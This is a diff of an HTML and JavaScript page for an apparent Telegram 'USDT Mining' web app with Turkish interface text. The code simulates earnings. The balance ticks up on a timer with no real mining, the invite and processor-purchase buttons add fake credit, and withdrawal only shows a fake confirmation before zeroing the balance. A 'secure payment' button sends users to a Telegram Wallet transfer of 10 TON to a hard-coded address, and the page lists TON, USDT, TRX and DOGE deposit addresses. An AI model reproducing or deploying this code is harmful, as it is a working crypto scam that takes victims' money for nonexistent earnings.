@@ -1,12 +1,224 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>USDT Mining Bot</title>
+  <title>USDT Mining App</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+      margin: 0;
+      background: #000000;
+      color: #ff1744;
+      padding-top: 2rem;
+    }
+    h1 {
+      color: #00e676;
+      margin-bottom: 1.5rem;
+    }
+    .balance {
+      font-size: 2rem;
+      margin-bottom: 1rem;
+    }
+    .spinner {
+      width: 100px;
+      height: 100px;
+      border: 10px solid rgba(255, 255, 255, 0.2);
+      border-top: 10px solid #00e676;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 1rem;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .mine-btn, .share-btn, .withdraw-btn, .pay-btn {
+      padding: 1rem 2rem;
+      font-size: 1.2rem;
+      background: #00e676;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 0.5rem;
+      transition: background 0.3s;
+    }
+    .mine-btn:hover, .share-btn:hover, .withdraw-btn:hover, .pay-btn:hover {
+      background: #1de9b6;
+    }
+    .referral-info {
+      font-size: 1rem;
+      margin-top: 1rem;
+      text-align: center;
+    }
+    .notification {
+      background-color: #1de9b6;
+      color: #000;
+      padding: 1rem;
+      margin-top: 1rem;
+      border-radius: 8px;
+      display: none;
+    }
+    .hardware-section {
+      margin-top: 2rem;
+      color: #00e676;
+    }
+    .hardware-item {
+      background: #111;
+      border: 1px solid #00e676;
+      border-radius: 10px;
+      padding: 1rem;
+      margin: 0.5rem;
+      width: 80%;
+    }
+    .wallet-section {
+      margin-top: 1.5rem;
+      font-size: 0.9rem;
+      color: #1de9b6;
+      text-align: left;
+    }
+    .wallet-icon {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #00e676;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+    .wallet-popup {
+      position: fixed;
+      bottom: 90px;
+      right: 20px;
+      background: #111;
+      border: 1px solid #00e676;
+      border-radius: 10px;
+      padding: 1rem;
+      color: #00e676;
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <h1>Hoş geldiniz!</h1>
-  <p>Bu sayfa USDT Mining Bot'un tanıtımıdır.</p>
+  <h1>USDT Mining</h1>
+  <div class="balance">USDT: <span id="usdtBalance">0.00000</span></div>
+  <div class="spinner" id="spinner" style="display: none;"></div>
+  <button class="mine-btn" id="mineBtn" onclick="startMining()">Başla</button>
+  <button class="share-btn" onclick="share()">Arkadaşlarını Davet Et</button>
+  <button class="withdraw-btn" onclick="requestWithdrawal()">Ödeme Talep Et</button>
+  <button class="pay-btn" onclick="payWithTelegramWallet()">Telegram Cüzdan ile Güvenli Ödeme</button>
+  <div class="referral-info" id="referralInfo">Paylaşılan kişi sayısı: <span id="refCount">0</span> / 100</div>
+
+  <div class="hardware-section">
+    <h2>İşlemci Satın Al</h2>
+    <div class="hardware-item" onclick="buyProcessor(33)">Ryzen 5 - Günlük Kazanç: 33 USDT</div>
+    <div class="hardware-item" onclick="buyProcessor(60)">Intel i7 - Günlük Kazanç: 60 USDT</div>
+    <div class="hardware-item" onclick="buyProcessor(95)">Apple M2 Pro - Günlük Kazanç: 95 USDT</div>
+  </div>
+
+  <div class="wallet-section">
+    <h3>Ödeme Adresleri:</h3>
+    <p><strong>TON:</strong> UQDyN-f4ZUbC0RT_RgW0IcwAxWy48Nbvw05TgWSi4Nhv2aOe</p>
+    <p><strong>USDT:</strong> TDCJDChfTyXY4qegtE6J9PBbhj6rwT5Qrj</p>
+    <p><strong>TRX:</strong> TDCJDChfTyXY4qegtE6J9PBbhj6rwT5Qrj</p>
+    <p><strong>DOGE:</strong> DM1DfvkB46xFy9WmN8Xr8jmAhLL3kb7Kdh</p>
+  </div>
+
+  <div class="wallet-icon" onclick="toggleWalletPopup()">💼</div>
+  <div class="wallet-popup" id="walletPopup">
+    <p>Kazancınız: <span id="walletUsdt">0.00000</span> USDT</p>
+    <p>Minimum çekim limiti: 800 USDT</p>
+  </div>
+
+  <div class="notification" id="notification"></div>
+
+  <script>
+    let usdt = 0;
+    let referrals = 0;
+    let miningActive = false;
+
+    function startMining() {
+      if (miningActive) return;
+      miningActive = true;
+      document.getElementById("mineBtn").disabled = true;
+      setInterval(() => {
+        const earned = 0.000150;
+        usdt += earned;
+        updateBalance();
+      }, 1000);
+    }
+
+    function share() {
+      if (referrals < 100) {
+        referrals++;
+        if (referrals % 10 === 0 && referrals <= 100) {
+          const bonus = 5;
+          usdt += bonus;
+          showNotification(`${referrals} kişi davet ettin! +${bonus} USDT bonus kazandın!`);
+        }
+        updateBalance();
+        document.getElementById("refCount").textContent = referrals;
+      }
+    }
+
+    function requestWithdrawal() {
+      if (usdt >= 800) {
+        showNotification(`Ödeme talebiniz alındı. 24 saat içinde işlenecek. Toplam: ${usdt.toFixed(5)} USDT`);
+        usdt = 0;
+        updateBalance();
+      } else {
+        showNotification("Ödeme talebi için en az 800 USDT gereklidir.");
+      }
+    }
+
+    function buyProcessor(amount) {
+      usdt += amount;
+      updateBalance();
+      showNotification(`${amount} USDT'lik işlemci satın alındı, kazanç eklendi.`);
+    }
+
+    function payWithTelegramWallet() {
+      const tonAmount = 10;
+      const tonAddress = "UQDyN-f4ZUbC0RT_RgW0IcwAxWy48Nbvw05TgWSi4Nhv2aOe";
+      const walletUrl = `https://t.me/wallet?startapp=transfer_ton-${tonAddress}-${tonAmount}`;
+      window.open(walletUrl, "_blank");
+    }
+
+    function showNotification(message) {
+      const note = document.getElementById("notification");
+      note.textContent = message;
+      note.style.display = "block";
+      setTimeout(() => {
+        note.style.display = "none";
+      }, 5000);
+    }
+
+    function updateBalance() {
+      document.getElementById("usdtBalance").textContent = usdt.toFixed(5);
+      document.getElementById("walletUsdt").textContent = usdt.toFixed(5);
+      if (window.Telegram.WebApp) {
+        Telegram.WebApp.sendData(JSON.stringify({ usdt, referrals }));
+      }
+    }
+
+    function toggleWalletPopup() {
+      const popup = document.getElementById("walletPopup");
+      popup.style.display = popup.style.display === "none" ? "block" : "none";
+    }
+
+    Telegram.WebApp.ready();
+  </script>
 </body>
 </html>
